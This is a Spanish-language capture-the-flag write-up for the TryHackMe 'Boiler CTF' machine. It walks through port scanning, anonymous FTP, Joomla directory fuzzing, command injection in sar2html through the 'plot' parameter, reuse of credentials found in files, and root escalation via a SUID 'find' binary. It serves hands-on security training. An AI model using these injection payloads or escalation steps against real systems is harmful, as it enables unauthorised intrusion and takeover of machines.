# Boiler CTF

## 1. Introducción

### 1.1 Antecedentes

Boiler CTF es una máquina de TryHackMe enfocada en el desarrollo de habilidades de **enumeración, explotación web y escalada de privilegios en Linux**.

La máquina presenta múltiples vectores de ataque, incluyendo:

- Servicios expuestos (FTP, HTTP, SSH)
- Aplicaciones web vulnerables
- Mala gestión de credenciales
- Binarios SUID explotables

Además, incorpora múltiples *rabbit holes* (pistas falsas), lo cual obliga a un proceso de enumeración metódico.

### 1.2 Objetivos

- Enumerar servicios expuestos en la máquina objetivo
- Identificar vulnerabilidades en aplicaciones web
- Obtener acceso inicial (foothold)
- Escalar privilegios hasta root
- Obtener flags de usuario y root

---

## 2. Enumeración

### 2.1 Nmap

Se realiza un escaneo completo de puertos:

```bash
sudo nmap -p- -Pn -sS -n --min-rate 5000 -oN allports --open
```

Resultados:

```bash
21/tcp    open  ftp
80/tcp    open  http
10000/tcp open  snet-sensor-mgmt
55007/tcp open  ssh
```

#### Análisis:

- **Puerto 21 (FTP)** → Permite login anónimo
- **Puerto 80 (HTTP)** → Aplicación web
- **Puerto 55007 (SSH)** → Acceso remoto no estándar
- **Puerto 10000 (HTTP) →** No relevante en este caso

### 2.2 FTP (Puerto 21)

Se accede con usuario anónimo:

```bash
ftp $IP
```

Se encuentra el archivo:

```bash
.info.txt
```

Contenido:

```
Whfg jnagrq gb frr vs lbh svaq vg...
```

Se identifica como **cifrado ROT13**, que al decodificar da:

```
Just wanted to see if you find it. Lol. Remember: Enumeration is the key!
```

### 2.3 Web

Se revisa:

```
http://$IP/robots.txt
```

Contenido relevante:

```
/tmp
/.ssh
/yellow
/not
/a+rabbit
/hole
/or
/is
/it
```

Muchos de estos son **rabbit holes**, diseñados para distraer

### 2.4 Descubrimiento de Joomla

Se identifica:

```
/joomla
```

Se ejecuta fuzzing:

```bash
gobuster dir -u http://$IP/joomla -w /usr/share/SecLists/... -x php,txt,html
```

Resultados importantes:

- `/administrator` → Panel de login
- `/configuration.php`
- Directorios no estándar (potencialmente interesantes)

### 2.5 Identificación de vulnerabilidad

Se detecta que el servidor utiliza:

```
sar2html
```

Investigando, se encuentra que es vulnerable a **Command Injection (RCE)**.

---

## 3. Explotación

### 3.1 Ejecución remota de comandos (RCE en sar2html)

El endpoint vulnerable:

```
index.php?plot=
```

Payload:

```
http://<IP>/index.php?plot=;<command>
```

Ejemplo:

```
index.php?plot=;whoami
```

Funciona correctamente → ejecución confirmada

### 3.2 Enumeración del sistema

Se listan archivos:

```
index.php?plot=;ls -la
```

Se identifica `log.txt` .

### 3.3 Obtención de credenciales

En log.txt se encuentra información con:

- Usuario: `basterd`
- Contraseña: `superduperp@$$`

### 3.4 Acceso SSH

```
ssh basterd@$IP-p55007
```

Acceso exitoso.

---

## 4. Post-explotación

### 4.1 Escalada lateral: usuario stoner

Dentro del home de `basterd`:

```bash
backup.sh
```

Este archivo contiene credenciales del usuario:

```bash
stoner:#superduperp@$$no1knows
```

Se reutilizan para acceso SSH:

```bash
ssh stoner@$IP -p55007
```

### 4.2 Obtención de user flag

En:

```bash
~/.secret
```

Se obtiene la **user flag**.

### 4.3 Escalada a root mediante SUID

Se enumeran binarios SUID:

```bash
find / -perm -4000 2>/dev/null
```

Se encuentra:

```bash
/usr/bin/find
```

Binario explotable (GTFOBins)

---

### 4.5 Explotación del binario

```bash
find . -exec whoami \;
```

Resultado:

```bash
root
```

Luego:

```bash
find . -exec ls /root/ \;
```

Se obtiene:

```bash
root.txt
```
